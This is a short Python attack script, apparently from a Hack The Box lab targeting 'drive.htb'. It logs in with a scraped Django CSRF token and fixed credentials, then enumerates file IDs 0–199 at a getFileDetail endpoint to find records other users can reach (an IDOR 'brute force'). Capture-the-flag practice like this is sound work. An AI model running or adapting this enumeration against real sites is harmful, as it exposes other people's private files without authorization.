from scapy.all import *
from termcolor import colored # How to use termcolor -> pypi.org/project/termcolor/

import signal
import sys
import time
import logging
import requests
from pwn import *
import pdb

# re.findall(r'name="csrfmiddlewaretoken" value="(.*?)"', content)[0]

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def def_handler(sig, frame):
    print(colored(f"\n\n[!] Exiting...\n", 'red'))
    p1.failure(colored(f"Brute force attack halted (Ctrl + c pressed)", 'red'))
    sys.exit(1)

# CTRL + c
signal.signal(signal.SIGINT, def_handler)
p1 = log.progress(colored(f"bruteForceIds", 'yellow'))
p1.status(colored(f"Sending Payload", 'green', attrs=["bold"]))

login_url = "http://drive.htb/login/"
s = requests.session()

def getCsrfToken():
    r = s.get(login_url)
    token = re.findall(r'name="csrfmiddlewaretoken" value="(.*?)"', r.text)[0]
    #print(r.text)
    #pdb.set_trace()
    return token

def login(token, username, password):
    post_data = {
        'csrfmiddlewaretoken': token,
        'username': username,
        'password': password
    }

    r = s.post(login_url, data=post_data)
    r = s.get("http://drive.htb/home/")
    #print(r.text)

def bruteForceIds():
    for id in range(0, 200):
        p1.status(colored(f"Trying ID [{id}]/200", 'magenta', attrs=["bold"]))
        file_url = f"http://drive.htb/{id}/getFileDetail/"
        r = s.get(file_url)
        #print(r.status_code)
        if r.status_code !=500:
            print(colored(f"\n==>[+] FOUND! ID [{id}]: {r.status_code}", 'green', attrs=["bold"]))
    p1.success(colored(f"\nSuccess!", 'cyan', attrs=["bold"]))

if __name__ == '__main__':
    csrfmiddlewaretoken = getCsrfToken()
    login(csrfmiddlewaretoken, 'foo', '#!P@55w0rd')
    #time.sleep(30)
    #print(csrfmiddlewaretoken)
    bruteForceIds()